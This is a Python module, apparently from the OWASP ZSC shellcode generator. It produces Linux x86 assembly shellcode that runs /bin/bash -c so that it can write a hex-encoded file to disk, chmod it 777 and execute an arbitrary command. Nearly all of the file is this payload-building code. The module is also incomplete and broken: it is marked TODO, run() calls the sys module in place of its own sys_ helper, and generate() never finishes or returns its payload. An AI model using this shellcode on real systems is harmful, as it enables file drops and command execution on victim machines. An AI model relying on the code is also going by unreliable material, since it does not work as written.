"""
OWASP ZSC
# TODO complete this module
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp_zsc[at]googlegroups[dot]com ]

shellcode template used : http://shell-storm.org/shellcode/files/shellcode-57.php
"""
from owasp_zsc.new_cores import base_module
import sys
import binascii
from owasp_zsc.cores import color
from owasp_zsc.cores import stack


def sys_(command):
    return '''push   $0xb
pop    %%eax
cltd
push   %%edx
%s
mov    %%esp,%%esi
push   %%edx
push   $0x632d9090
pop    %%ecx
shr    $0x10,%%ecx
push   %%ecx
mov    %%esp,%%ecx
push   %%edx
push   $0x68
push   $0x7361622f
push   $0x6e69622f
mov    %%esp,%%ebx
push   %%edx
push   %%edi
push   %%esi
push   %%ecx
push   %%ebx
mov    %%esp,%%ecx
int    $0x80
''' % (str(command))


def run(data):
    filename, content, command = data[0], data[1], data[2]
    command = command.replace('[space]', ' ')
    try:
        cont = binascii.b2a_hex(open(content).read())
    except:
        from owasp_zsc.cores import start
        sys.exit(color.color('red') + 'Error, Cannot find/open the file %s' % (
            content) + color.color('reset'))
    l = len(cont) - 1
    n = 0
    c = '\\x'
    for word in cont:
        c += word
        n += 1
        if n == 2:
            n = 0
            c += '\\x'
    c = c[:-2]
    command = 'echo -e "%s" > %s ; chmod 777 %s ; %s' % (
        str(c), str(filename), str(filename), str(command))
    return sys(stack.generate(
        command.replace('[space]', ' '), '%ecx', 'string'))


class Module(base_module.BaseModule):
    file_dest = base_module.OptString("", "File Destination")
    data = base_module.OptString("", "File data")
    command_exec = base_module.OptString("", "Command to execute")

    def generate(self):
        # command = f"echo -e \"{self.}"
        payload = "push   $0xb\n"
        payload += "pop    %%eax\n"
        payload += "cltd\n"
        payload += "push   %%edx\n"
        payload += "%s\n"
        payload += "mov    %%esp,%%esi\n"
        payload += "push   %%edx\n"
        payload += "push   $0x632d9090\n"
        payload += "pop    %%ecx\n"
        payload += "shr    $0x10,%%ecx\n"
        payload += "push   %%ecx\n"
        payload += "mov    %%esp,%%ecx\n"
        payload += "push   %%edx\n"
        payload += "push   $0x68\n"
        payload += "push   $0x7361622f\n"
        payload += "push   $0x6e69622f\n"
        payload += "mov    %%esp,%%ebx\n"
        payload += "push   %%edx\n"
        payload += "push   %%edi\n"
        payload += "push   %%esi\n"
        payload += "push   %%ecx\n"
        payload += "push   %%ebx\n"
        payload += "mov    %%esp,%%ecx\n"
        payload += "int    $0x80"
